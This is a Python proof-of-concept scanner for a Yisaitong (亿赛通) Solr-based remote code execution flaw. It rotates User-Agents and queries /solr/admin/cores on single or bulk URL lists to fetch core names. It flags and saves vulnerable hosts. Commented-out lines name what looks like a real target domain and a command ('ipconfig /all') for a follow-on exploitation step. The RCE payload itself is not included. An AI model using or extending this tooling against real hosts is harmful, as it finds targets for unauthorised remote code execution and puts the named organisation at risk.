#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2021-02-21 16:34:54
# @Author  : 江南小虫虫 (fwh13612265462@gmail.com)
# @Link    : https://fengwenhua.top

import requests
requests.packages.urllib3.disable_warnings()
import urllib.parse
import re
import sys
import argparse
import random


def usera():
    """随机选择UA
    """
    user_agent_list = [
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
        'Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3',
        'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)',
        'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
        'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0',
        'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    ]
    # 随机选择一个
    user_agent = random.choice(user_agent_list)
    return user_agent


def poc(target):
    """获取solr名字，默认是flow，同时也是poc
    :param target: 目标，http(s)://ip(domain):port，后面没有/
    :return
    """
    url = '{}/solr/admin/cores'.format(target)
    headers = {
        'User-Agent': usera()
    }
    try:
        r = requests.get(url, headers=headers, verify=False, timeout=10)
        #  and '<lst name="responseHeader">' in r.text
        # print("漏洞探测：")
        final_result = r.text
        if r.status_code == 200:
            result = re.search(
                r'<str name="name">([\s\S]*?)</str><str name="instanceDir">', final_result, re.I)
            if result:
                final_result = result.group(1)
                # print('core_name: ', final_result)
                return final_result
            else:
                # print(r.text)
                return False
        else:
            # print(r.text)
            return False

    except requests.exceptions.RequestException as e:
        print(e, file=logs_file)


def load_file(file_path):
    with open(file_path, 'r') as f:
        url_list = f.read().splitlines()
        # print(url_list)
        return url_list


def write_file(data_list):
    with open('yisaitong-vul-list.txt', 'w') as f:
        f.write('\n'.join(data_list))


if __name__ == '__main__':
    # # target后面没有 /
    #target = 'https://www.chinashb.com:8443'
    #cmd = 'ipconfig /all'
    if len(sys.argv) == 1:
        print("Usage: python3 yisaitong-poc.py -u url -f url.txt")
        sys.exit()
    parser = argparse.ArgumentParser(
        description='亿赛通rce利用工具')
    parser.add_argument('-u', '--url', help='指定单个url')
    parser.add_argument('-f', '--file', help='指定要测试的urls文件')
    args = parser.parse_args()

    logs_file = open('yisaitong-log.txt', 'w')
    target = args.url
    if target:
        core_name = poc(target)
        if core_name:
            print("VUL")
        else:
            print('NO VUL')
    if args.file:
        vul_url_list = []
        for url in load_file(args.file):
            print('处理：', url)
            print('处理：' + url, file=logs_file)
            core_name = poc(url)
            if core_name:
                print('VUL: ' + url)
                print('VUL: ' + url, file=logs_file)
                vul_url_list.append(url)
            else:
                print('NO VUL: ' + url)
                print('NO VUL: ' + url, file=logs_file)
        if len(vul_url_list) > 0:
            write_file(vul_url_list)
            print("url列表已经写入文件当前目录下的 yisaitong-vul-list.txt 了")
    logs_file.close()
